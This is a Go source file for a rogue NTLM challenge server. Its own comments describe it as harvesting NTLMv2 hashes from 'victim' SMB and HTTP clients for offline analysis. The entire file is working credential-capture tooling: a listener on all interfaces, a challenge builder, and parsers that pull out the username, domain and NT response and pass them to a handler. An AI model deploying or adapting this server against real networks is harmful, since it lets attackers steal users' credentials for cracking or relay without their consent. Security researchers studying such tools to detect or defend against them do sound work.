// Package ntlm implements the wire messages of the NTLM authentication
// protocol and a challenge server that captures NTLMv2 authentication
// material from unsolicited clients.
//
// The protocol is only implemented to the extent needed to capture the
// NTLMv2 response that a victim's SMB/HTTP client sends after receiving a
// server challenge. No user credentials are validated; the server's purpose
// in this framework is to harvest hashes for offline analysis.
package ntlm

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
)

// Signature is the NTLMSSP message header.
var Signature = []byte{'N', 'T', 'L', 'M', 'S', 'S', 'P', 0x00}

// NTLM message types.
const (
	msgNegotiate = 0x00000001
	msgChallenge = 0x00000002
	msgAuthentic = 0x00000003
)

// Negotiate flags we care about.
const (
	flagUnicode   = 0x00000001
	flagNTLM      = 0x00000200
	flagNTLMv2Key = 0x00080000
)

// securityBuffer is an NTLM security buffer: (length, max length, offset).
type securityBuffer struct {
	length uint16
	offset uint32
}

func (s securityBuffer) parse(pkt []byte, base int) []byte {
	end := int(s.offset) + int(s.length)
	if end > len(pkt) || int(s.offset) < 0 {
		return nil
	}
	return pkt[s.offset:end]
}

func putSecurityBuffer(b []byte, at int, data []byte, offset uint32) int {
	binary.LittleEndian.PutUint16(b[at:], uint16(len(data)))
	binary.LittleEndian.PutUint16(b[at+2:], uint16(len(data)))
	binary.LittleEndian.PutUint32(b[at+4:], offset)
	return at + 8
}

// IsNTLM reports whether the buffer begins with the NTLMSSP signature.
func IsNTLM(pkt []byte) bool {
	return len(pkt) >= 8 && bytes.Equal(pkt[:8], Signature)
}

// MessageType returns the NTLM message type of a signed packet.
func MessageType(pkt []byte) (uint32, error) {
	if !IsNTLM(pkt) {
		return 0, errors.New("not an NTLM message")
	}
	if len(pkt) < 12 {
		return 0, errors.New("truncated NTLM header")
	}
	return binary.LittleEndian.Uint32(pkt[8:12]), nil
}

// BuildChallenge constructs an NTLM Type 2 (challenge) message. challenge is
// the 8-byte server nonce, or a random one is generated when nil.
func BuildChallenge(challenge []byte, targetName string) ([]byte, error) {
	if len(challenge) == 0 {
		challenge = make([]byte, 8)
		if _, err := rand.Read(challenge); err != nil {
			return nil, err
		}
	}
	if len(challenge) != 8 {
		return nil, errors.New("challenge must be 8 bytes")
	}

	var body bytes.Buffer
	body.Write(Signature)
	var mtype [4]byte
	binary.LittleEndian.PutUint32(mtype[:], msgChallenge)
	body.Write(mtype[:])
	// Target name security buffer (16 bytes, incl. maxlen) + flags + challenge.
	target := []byte(targetName)
	flags := uint32(flagUnicode | flagNTLM | flagNTLMv2Key)
	headerLen := 32 + 16 + 4 + 8 + 8 + 8 + 8
	targetOffset := uint32(headerLen)
	buf := make([]byte, 0, headerLen+len(target))
	buf = append(buf, body.Bytes()...)
	sec := make([]byte, 16)
	putSecurityBuffer(sec, 0, target, targetOffset)
	putSecurityBuffer(sec, 8, nil, 0) // target info
	buf = append(buf, sec...)
	f := make([]byte, 4)
	binary.LittleEndian.PutUint32(f, flags)
	buf = append(buf, f...)
	buf = append(buf, challenge...)
	// Context (8) + target info (8) zeroed.
	buf = append(buf, make([]byte, 16)...)
	buf = append(buf, target...)
	return buf, nil
}

// Type1 carries the parsed client negotiate message.
type Type1 struct {
	Domain string
	Host   string
}

// ParseType1 extracts the client identity fields from a negotiate message.
func ParseType1(pkt []byte) (Type1, error) {
	var t Type1
	if err := requireType(pkt, msgNegotiate); err != nil {
		return t, err
	}
	if len(pkt) < 32 {
		return t, errors.New("truncated type 1 message")
	}
	if len(pkt) >= 48 {
		t.Domain = string(readBuffer(pkt, 40))
		t.Host = string(readBuffer(pkt, 48))
	}
	return t, nil
}

// Type3 is a parsed authenticate message containing the captured material.
type Type3 struct {
	Username   string
	Domain     string
	NTResponse []byte // NTLMv2 response (the valuable hash material)
	LMResponse []byte
}

// ParseType3 extracts the authentication material from an authenticate
// message. The challenge that was presented to the client is returned via
// caller-supplied challenge so it can be stored alongside the hash.
func ParseType3(pkt []byte) (Type3, error) {
	var t Type3
	if err := requireType(pkt, msgAuthentic); err != nil {
		return t, err
	}
	if len(pkt) < 64 {
		return t, errors.New("truncated type 3 message")
	}
	t.LMResponse = readBuffer(pkt, 12)
	t.NTResponse = readBuffer(pkt, 20)
	t.Domain = string(readBuffer(pkt, 28))
	t.Username = string(readBuffer(pkt, 36))
	return t, nil
}

func requireType(pkt []byte, want uint32) error {
	got, err := MessageType(pkt)
	if err != nil {
		return err
	}
	if got != want {
		return fmt.Errorf("expected NTLM type %d, got %d", want, got)
	}
	return nil
}

// readBuffer reads a security buffer at the given byte offset.
func readBuffer(pkt []byte, at int) []byte {
	if at+8 > len(pkt) {
		return nil
	}
	sb := securityBuffer{
		length: binary.LittleEndian.Uint16(pkt[at:]),
		offset: binary.LittleEndian.Uint32(pkt[at+4:]),
	}
	return sb.parse(pkt, at)
}

// CapturedHash is a single NTLM hash capture record.
type CapturedHash struct {
	Username   string
	Domain     string
	Challenge  []byte
	NTResponse []byte
	Client     string
}

// Handler is called for every captured hash. The server keeps running.
type Handler func(CapturedHash)

// Server is a challenge server that answers NTLM negotiate messages with a
// challenge and captures the resulting authenticate messages.
type Server struct {
	ln        net.Listener
	handler   Handler
	target    string
	challenge []byte

	Accepted atomic.Uint64 // handshakes completed
	Captured atomic.Uint64 // hashes captured
	mu       sync.Mutex
	conns    map[net.Conn]bool
	done     chan struct{}
}

// NewServer creates an NTLM capture server. When challenge is nil a fresh
// random one is generated per handshake. target is the domain shown in the
// type 2 message.
func NewServer(handler Handler, target string) *Server {
	s := &Server{handler: handler, target: target}
	s.conns = map[net.Conn]bool{}
	s.done = make(chan struct{})
	return s
}

// Start listens on addr ("0.0.0.0:8445") and begins serving. It returns the
// bound address.
func (s *Server) Start(addr string) (net.Addr, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}
	s.ln = ln
	go s.acceptLoop()
	return ln.Addr(), nil
}

func (s *Server) acceptLoop() {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			select {
			case <-s.done:
				return
			default:
			}
			continue
		}
		s.mu.Lock()
		s.conns[conn] = true
		s.mu.Unlock()
		go s.handle(conn)
	}
}

func (s *Server) handle(conn net.Conn) {
	defer func() {
		s.mu.Lock()
		delete(s.conns, conn)
		s.mu.Unlock()
		conn.Close()
	}()

	challenge := s.challenge
	if len(challenge) == 0 {
		challenge = make([]byte, 8)
		if _, err := rand.Read(challenge); err != nil {
			return
		}
	}

	// The client opens with a negotiate (type 1). SMB sessions also send an
	// SMB2 negotiate first; scan forward for the NTLMSSP blob.
	buf := make([]byte, 0, 4096)
	tmp := make([]byte, 4096)
	for {
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
			if idx := findNTLM(buf); idx >= 0 {
				buf = buf[idx:]
				break
			}
		}
		if err != nil {
			return
		}
		if len(buf) > 8192 {
			return
		}
	}

	t, err := ParseType1(buf)
	if err != nil {
		return
	}
	_ = t

	resp, err := BuildChallenge(challenge, s.target)
	if err != nil {
		return
	}
	if _, err := conn.Write(resp); err != nil {
		return
	}
	s.Accepted.Add(1)

	// Read the authenticate message.
	n, err := io.ReadFull(conn, tmp[:8])
	if err != nil {
		return
	}
	_ = n
	total := append([]byte{}, tmp[:8]...)
	for len(total) < 64 {
		chunk := make([]byte, 64-len(total))
		n, err := conn.Read(chunk)
		if n > 0 {
			total = append(total, chunk[:n]...)
		}
		if err != nil {
			return
		}
	}
	// Grow to cover the security buffers referenced.
	if len(total) < 512 {
		rest := make([]byte, 512-len(total))
		n, err := conn.Read(rest)
		if n > 0 {
			total = append(total, rest[:n]...)
		}
		_ = err
	}

	t3, err := ParseType3(total)
	if err != nil {
		return
	}
	s.Captured.Add(1)
	if s.handler != nil {
		s.handler(CapturedHash{
			Username:   t3.Username,
			Domain:     t3.Domain,
			Challenge:  challenge,
			NTResponse: t3.NTResponse,
			Client:     conn.RemoteAddr().String(),
		})
	}
}

// findNTLM locates the NTLMSSP signature within the buffer, skipping any
// preceding SMB headers.
func findNTLM(buf []byte) int {
	for i := 0; i+8 <= len(buf); i++ {
		if bytes.Equal(buf[i:i+8], Signature) {
			return i
		}
	}
	return -1
}

// Stop closes the listener and all active connections.
func (s *Server) Stop() {
	select {
	case <-s.done:
		return
	default:
		close(s.done)
	}
	if s.ln != nil {
		s.ln.Close()
	}
	s.mu.Lock()
	for c := range s.conns {
		c.Close()
	}
	s.conns = map[net.Conn]bool{}
	s.mu.Unlock()
}

// Addr returns the bound address, or nil before Start.
func (s *Server) Addr() net.Addr {
	if s.ln == nil {
		return nil
	}
	return s.ln.Addr()
}
